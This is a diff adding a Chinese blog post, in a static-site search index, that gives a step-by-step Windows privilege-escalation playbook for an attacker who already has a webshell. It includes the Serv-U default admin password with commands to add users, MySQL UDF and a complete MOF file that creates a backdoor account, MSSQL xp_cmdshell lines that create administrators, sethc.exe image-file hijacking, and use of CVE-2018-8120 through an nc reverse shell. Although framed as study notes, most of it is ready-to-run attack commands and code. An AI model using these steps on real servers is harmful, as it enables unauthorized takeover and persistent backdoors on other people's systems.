@@ -1,6 +1,259 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Windows系统提权</title>
+    <url>/2020/08/05/Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>在Windows下要进行权限提升，通常需要先进行信息收集，如：服务器开启服务、服务器补丁信息、安全策略、杀软信息等，然后选择适当的方式提权。</p>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p>当前为得到webshell的前提下进行</p>
+<h3 id="1-服务器信息"><a href="#1-服务器信息" class="headerlink" title="1. 服务器信息"></a>1. 服务器信息</h3><ul>
+<li>netstat -ano                                   确认服务器上端口情况，以最终确定服务。</li>
+<li>tasklist /svc                                    收集任务列表<ul>
+<li>将该信息提交到这个网站即可查询杀软:<a href="https://www.ddosi.com/av/1.php" target="_blank" rel="noopener">windows杀软在线查询</a></li>
+</ul>
+</li>
+<li>systeminfo                                     查看系统信息<ul>
+<li>将反馈信息交给Windows-Exploit-Suggester脚本,将会反馈未打补丁信息</li>
+<li>wmic qfe get Caption,Description,HotFixID,InstalledOn    列出已安装的补丁</li>
+</ul>
+</li>
+<li>set                                                   查看环境变量</li>
+<li>net user                                         查看用户信息</li>
+<li>whoami /priv                                查看当前用户权限</li>
+<li>quser or query user                     获取在线用户</li>
+<li>netstat -ano | findstr 3389         获取连接来源IP</li>
+<li>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber                      获取远程端口</li>
+</ul>
+<h2 id="二、进行提权"><a href="#二、进行提权" class="headerlink" title="二、进行提权"></a>二、进行提权</h2><h3 id="2-Serv-u-提权"><a href="#2-Serv-u-提权" class="headerlink" title="2. Serv-u 提权"></a>2. Serv-u 提权</h3><h4 id="1-Serv-u-介绍"><a href="#1-Serv-u-介绍" class="headerlink" title="1. Serv-u 介绍"></a>1. Serv-u 介绍</h4><p>Serv-U FTP Server，是一种被广泛运用的[FTP服务器]端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等，功能非常完备。 它具有非常完备的安全特性，支持SSL FTP传输，支持在多个Serv-U和FTP客户端通过SSL加密连接保护您的数据安全等。</p>
+<h4 id="2-Serv-u-默认配置信息"><a href="#2-Serv-u-默认配置信息" class="headerlink" title="2. Serv-u 默认配置信息"></a>2. Serv-u 默认配置信息</h4><table>
+<thead>
+<tr>
+<th>配置</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>默认端口</td>
+<td>43958</td>
+</tr>
+<tr>
+<td>默认安装路径</td>
+<td>C:\Program Files\</td>
+</tr>
+<tr>
+<td>进程默认登陆权限</td>
+<td>本地系统账户</td>
+</tr>
+<tr>
+<td>配置文件</td>
+<td>Serv-U、ServUDaemon.ini</td>
+</tr>
+<tr>
+<td>加密算法</td>
+<td>两位随机字符xy+MD5（两位随机字符xy+明文password）</td>
+</tr>
+</tbody></table>
+<h4 id="3-Serv-u-提权条件"><a href="#3-Serv-u-提权条件" class="headerlink" title="3. Serv-u 提权条件"></a>3. Serv-u 提权条件</h4><p>Serv-u服务登录身份必须为本地系统账户或者administrators组用户才可以提权成功。</p>
+<h4 id="4-提权原理"><a href="#4-提权原理" class="headerlink" title="4. 提权原理"></a>4. 提权原理</h4><p>​    Serv-u的管理控制台采用的是http协议，致使恶意攻击只需要构造合法的数据包进行提交就如同在管理控制台上操作一样，因此我们才可以利用诸如asp、aspx、php等脚本连接Serv-u的43958端口进行管理操作，例如新增ftp账号，利用该账号执行系统命令等等。</p>
+<p>​    由于Serv-u的默认管理端口13958只允许本地连接，因此只要获取到webshell就可以利用脚本进行连接了。</p>
+<h4 id="5-Serv-u-提权思路"><a href="#5-Serv-u-提权思路" class="headerlink" title="5. Serv-u 提权思路"></a>5. Serv-u 提权思路</h4><p>一般有两种思路</p>
+<ul>
+<li><p>第一种：Serv-u管理控制台采用默认密码，即密码为空</p>
+<ul>
+<li><p>当这种情况时，可直接使用webshell脚本连接Serv-u管理控制台的43958端口进行提取操作即可。</p>
+</li>
+<li><table>
+<thead>
+<tr>
+<th>参数名称</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Name</td>
+<td>localadministrator</td>
+</tr>
+<tr>
+<td>Pass</td>
+<td>#|@$ak#.|k;0@P</td>
+</tr>
+<tr>
+<td>Port</td>
+<td>43958</td>
+</tr>
+<tr>
+<td>Cmd</td>
+<td>cmd.exe /c net user webadmin webadmin /add</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>虽然默认密码为空，但当配置文件ServUDaemon.ini中不存在Serv-u管理控制台的密文是，即密码为空时Serv-u默认会采用ServUAdmin.exe当中保存的密码进行验证,该密码通过逆向分析得到的结果即为提权脚本中Pass参数默认的值,这里的CMD参数是我们需要执行的DOS命令,通常会执行加用户的操作.</p>
+</li>
+</ul>
+</li>
+<li><p>第二种：Serv-u管理控制台默认密码已修改</p>
+<ul>
+<li>如果在连接时,返回信息:由于目标积极拒绝,无法连接.证明密码改了</li>
+<li>第一类:Serv-u配置文件ServUDaemon.ini可读可写<ul>
+<li>尝试破解配置文件中的管理员密码或者具有执行权限的FTP用户的密码,管理员密码密文在配置文件中的对应字段为LocalSetuoPassword,FTP用户权限对应字典为Access,其中E选项代表执行权限</li>
+<li>得到密码后,即可使用webshell脚本提权.</li>
+</ul>
+</li>
+<li>第二类:Serv-u配置文件ServUDaemon.ini不可读可写<ul>
+<li>利用md5 直接去解密(ini文件密码在ftp连)</li>
+<li>默认密码,默认用户.</li>
+<li>不是默认密码时 直接把SerUAdmin.exe 下载下来 进行查看密码.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>总结:</p>
+<ul>
+<li>serv-u配置文件无修改权限，但是可以看到配置文件，进行口令破解<ul>
+<li>看到FTP用户的配置文件ServUDaemon.ini，在其中找到Maintenance=System的用户，该用户就是系统管理员。如果能够成功破解系统管理员的口令，就可以利用该管理员执行添加系统管理员的用户</li>
+<li>serv-u配置文件中Password字段就是用户口令加密变换后的字符串，破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。</li>
+</ul>
+</li>
+<li>serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权<ul>
+<li>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。</li>
+<li>虽然，网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查 ServUAdmin.exe文件来获取管理账号和口令。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-MySQL-提权"><a href="#3-MySQL-提权" class="headerlink" title="3. MySQL 提权"></a>3. MySQL 提权</h3><h4 id="3-1-UDF-提权"><a href="#3-1-UDF-提权" class="headerlink" title="3.1 UDF 提权"></a>3.1 UDF 提权</h4><h5 id="3-1-1-UDF提权原理"><a href="#3-1-1-UDF提权原理" class="headerlink" title="3.1.1 UDF提权原理"></a>3.1.1 UDF提权原理</h5><p>​    MySQL本身支持很多内建函数,此外还可以创建存储方法来定义函数,UDF(User Defined Function)为用户提供了一种更高效的方式来创建函数.因此当我们获得了一个MySQL的root权限后,就可以创建用户自定义函数(UDF),并且利用该用户自定义函数执行系统命令,将MySQL的root权限成功转化为系统权限</p>
+<ul>
+<li>基本分为三步<ol>
+<li>把含义自定义函数（如执行系统命令函数“sys_eval”）的dll文件放入特定文件夹下。</li>
+<li>声明引入这个dll文件中的自定义函数。</li>
+<li>使用自定义的函数。</li>
+</ol>
+</li>
+</ul>
+<h5 id="3-1-2-UDF提权条件"><a href="#3-1-2-UDF提权条件" class="headerlink" title="3.1.2 UDF提权条件"></a>3.1.2 UDF提权条件</h5><pre><code>1. 已经拥有MySQL的某个账号,此账号必须有对MySQL数据库的insert和delete权限以创建和抛弃函数,通常是root权限的账号.
+   2. MySQL服务的登录身份为administrator以上权限(拥有可以将udf.dll写入相应目录的权限)
+   3. 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下
+   4. 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</code></pre><h5 id="3-1-3-UDF提权过程"><a href="#3-1-3-UDF提权过程" class="headerlink" title="3.1.3 UDF提权过程"></a>3.1.3 UDF提权过程</h5><ol>
+<li><p>收集必要信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select version();                        &#x2F;&#x2F;获取数据库版本</span><br><span class="line">select user();                           &#x2F;&#x2F;获取数据库用户</span><br><span class="line">select @@basedir;                        &#x2F;&#x2F;获取数据库安装目录</span><br><span class="line">show variables like &quot;%char%&quot;;            &#x2F;&#x2F;寻找mysql安装路径</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果MySQL版本高于5.1，则创建导出文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">select &#39;it is dll&#39; into dumpfile &#39; c:\\phpStudy\\MySQL\\share\\charsets\\lib::$INDEX_ALLOCATION&#39;;</span><br><span class="line">select &#39;it is dll&#39; into dumpfile &#39; c:\\phpStudy\\MySQL\\share\\charsets\\lib\\plugin::$INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接用webshell在mysql安装路径下创建piugin目录，再导入udf.dll</p>
+</li>
+<li><p>导入udf.dll</p>
+<p>在sqlmap的目录：<strong>sqlmap/udf/mysql/windows</strong>下就有udf.dll文件，选择确定的mysql位数，再使用<strong>sqlmap/extra/cloak</strong>目录下的<strong>cloak.py</strong>进行解码，解码后导入对方对应目录下，创建sys_exec函数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_exec  returns string soname &quot;lib_mysqludf_sys.dll&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_eval (&#39;whoami&#39;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>清除痕迹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop function cmdshell;             &#x2F;&#x2F;将函数删除</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h4 id="3-2-CVE-2012-5613-提权"><a href="#3-2-CVE-2012-5613-提权" class="headerlink" title="3.2 CVE-2012-5613 提权"></a>3.2 CVE-2012-5613 提权</h4><h5 id="3-2-1-提权条件"><a href="#3-2-1-提权条件" class="headerlink" title="3.2.1 提权条件"></a>3.2.1 提权条件</h5><ol>
+<li>windows 03及以下版本</li>
+<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
+<li>secure-file-priv参数不为null</li>
+</ol>
+<h5 id="3-2-2-提权方法"><a href="#3-2-2-提权方法" class="headerlink" title="3.2.2 提权方法"></a>3.2.2 提权方法</h5><ol>
+<li><p>该漏洞利用的exp是一个mof文件，所以该方式又被称为mof提权。</p>
+</li>
+<li><p>将以下内容保存为mof文件即可</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace(“\\\\.\\root\\subscription”)</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = “Root\\Cimv2”;</span><br><span class="line">Name = “filtP2”;</span><br><span class="line">Query = “Select * <span class="keyword">From</span> __InstanceModificationEvent “</span><br><span class="line">“Where TargetInstance Isa \”Win32_LocalTime\” “</span><br><span class="line">“<span class="keyword">And</span> TargetInstance.Second = 5”;</span><br><span class="line">QueryLanguage = “WQL”;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = “consPCSV2”;</span><br><span class="line">ScriptingEngine = “JScript”;</span><br><span class="line">ScriptText =</span><br><span class="line">“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.<span class="builtin-name">run</span>(\”net.exe<span class="built_in"> user </span>webadmin webadmin /add\”)“;  # 可修改括号内命令</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将该文件上传到Web目录下，执行如下命令导出mof文件到系统mof目录，在导出成功后，系统会加载该mof文件，之后新增用户操作便成功了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;test.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>一般会分两次来导入该脚本，第一次创建用户，即为上面的命令，第二次，将上面的命令改为</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net.exe localgroup administrators webadmin /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>
+
+<p>将创建好的用户命令提权。</p>
+</li>
+</ol>
+<h5 id="3-2-3-MOF提权的弊端"><a href="#3-2-3-MOF提权的弊端" class="headerlink" title="3.2.3 MOF提权的弊端"></a>3.2.3 MOF提权的弊端</h5><ul>
+<li><p>提权成功后，就算被删号，mof也会在五秒内将原账号重建，这会使得退出测试比较麻烦，所以谨慎使用。</p>
+</li>
+<li><p>删除账号操作</p>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> stop winmgmt</span><br><span class="line"><span class="built_in">del</span> c:/windows/system32/wbem/repository</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="4-MsSQL-提权"><a href="#4-MsSQL-提权" class="headerlink" title="4. MsSQL 提权"></a>4. MsSQL 提权</h3><h4 id="MsSQL-提权"><a href="#MsSQL-提权" class="headerlink" title="MsSQL 提权"></a>MsSQL 提权</h4><ul>
+<li>SQL Server有很多的扩展程序，这些扩展过程可以实现各种特定的功能，当在渗透过程中获得了一个sa权限的数据库账号后，便可以调用这些扩展过程执行提权操作</li>
+</ul>
+<h4 id="MsSQL提权条件"><a href="#MsSQL提权条件" class="headerlink" title="MsSQL提权条件"></a>MsSQL提权条件</h4><ol>
+<li>获得一个sa权限的数据库账号</li>
+<li>MsSQL服务誊录身份为administrator以上权限</li>
+</ol>
+<h4 id="MsSQL提权过程"><a href="#MsSQL提权过程" class="headerlink" title="MsSQL提权过程"></a>MsSQL提权过程</h4><ul>
+<li><p>在SQL Server中用来提权频率最高的扩展过程，该扩展过程可以用来执行dos命令</p>
+</li>
+<li><p>当得到sa后，可以利用webshell来连接数据库，执行dos命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#39;net user aaa aaa &#x2F;add &amp;&amp; net localgroup administrators aaa &#x2F;add&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果执行失败，先检查xp_cmdshell是否存在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*)from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果返回1，则证明存在，如果返回0，则需要通过xplog70.dll恢复  <a href="/download/xplog70.7z">xplog70</a></p>
+</li>
+<li><p>开启xp_cmdshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;</span><br><span class="line">    Reconfigure;</span><br><span class="line">    EXEC sp_configure &#39;xp_cmdshell&#39;, 1;</span><br><span class="line">    RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="利用映像劫持提权"><a href="#利用映像劫持提权" class="headerlink" title="利用映像劫持提权"></a>利用映像劫持提权</h5><ul>
+<li><p>利用xp_regwrite函数修改注册表，起到劫持作用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后检查是否劫持成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;Debugger&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>返回没有问题 利用远程连接然后5次shift键，发现没有启动粘滞键，而是启动了cmd，然后就可以创建用户了</p>
+</li>
+</ul>
+<h3 id="5-本地溢出提权"><a href="#5-本地溢出提权" class="headerlink" title="5. 本地溢出提权"></a>5. 本地溢出提权</h3><h4 id="5-1-提权原理"><a href="#5-1-提权原理" class="headerlink" title="5.1 提权原理"></a>5.1 提权原理</h4><ul>
+<li><p>本地提权漏洞是软件安全漏洞的一种，他是可以是攻击者得到权限提升的漏洞，通常发生于操作系统核心组件、驱动程序或拥有高权限的服务进程等程序中，由于这些软件在设计过程的逻辑错误或代码BUG，可以让地权限的程序不经过审核地获得到更高的系统权限，从而操作更多的系统资源。</p>
+</li>
+<li><p>本地一处提权就是利用系统本身或者第三方软件的缓冲区溢出漏洞进行的提权操作，由于该提权漏洞需要在本地进行操作利用，因此称为本地溢出。</p>
+</li>
+<li><p>此处拿CVE-2018-8120来举例，下列为受影响的系统版本</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems<span class="built_in"> Service </span>Pack 1   </span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems<span class="built_in"> Service </span>Pack 1      </span><br><span class="line">Windows<span class="built_in"> Server </span>2008 <span class="keyword">for</span> 32-bit Systems<span class="built_in"> Service </span>Pack 2</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 <span class="keyword">for</span> 32-bit Systems<span class="built_in"> Service </span>Pack 2</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 <span class="keyword">for</span> Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 <span class="keyword">for</span> x64-based Systems<span class="built_in"> Service </span>Pack 2</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 <span class="keyword">for</span> x64-based Systems<span class="built_in"> Service </span>Pack 2</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 R2 <span class="keyword">for</span> Itanium-Based Systems ServicePack 1</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br><span class="line">Windows<span class="built_in"> Server </span>2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="5-2-提权过程"><a href="#5-2-提权过程" class="headerlink" title="5.2 提权过程"></a>5.2 提权过程</h4><ul>
+<li>当我们已经得到一个webshell后，可以nc反弹回一个交互式命令行，上传<a href="https://github.com/unamer/CVE-2018-8120" target="_blank" rel="noopener">exp</a>，在交互式命令行中输入程序名称，后面跟上要执行的操作即可。</li>
+</ul>
+<h3 id="6-其他提权方式"><a href="#6-其他提权方式" class="headerlink" title="6. 其他提权方式"></a>6. 其他提权方式</h3><ul>
+<li>RealVNC提权</li>
+<li>Radmin提权</li>
+<li>PcAnywhere提权</li>
+<li>FileZilla FTP提权</li>
+<li>G6FTP提权</li>
+<li>DLL劫持提权</li>
+<li>写入启动项提权</li>
+<li>替换文件提权</li>
+<li>虚拟主机管理系统提权</li>
+<li>win10pcap提权</li>
+<li>凭据爆破提权</li>
+<li>高权限安装提权（任意用户以NT AUTHORITY\SYSTEM权限安装msi）</li>
+<li>计划任务提权</li>
+<li>…………</li>
+</ul>
+]]></content>
+      <categories>
+        <category>学习总结</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域渗透---前篇</title>
     <url>/2020/06/12/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%89%8D%E7%AF%87/</url>
     <content><![CDATA[<h2 id="一、域环境"><a href="#一、域环境" class="headerlink" title="一、域环境"></a>一、域环境</h2><h4 id="1-什么是域"><a href="#1-什么是域" class="headerlink" title="1. 什么是域"></a>1. 什么是域</h4><p>Domain——域是<strong>Windows</strong>网络中独立运行的单位，将网络中多台计算机<strong>逻辑</strong>上组织到起,进行集中管理，这种区别于工作组的<strong>逻辑环境</strong>叫做域。</p>
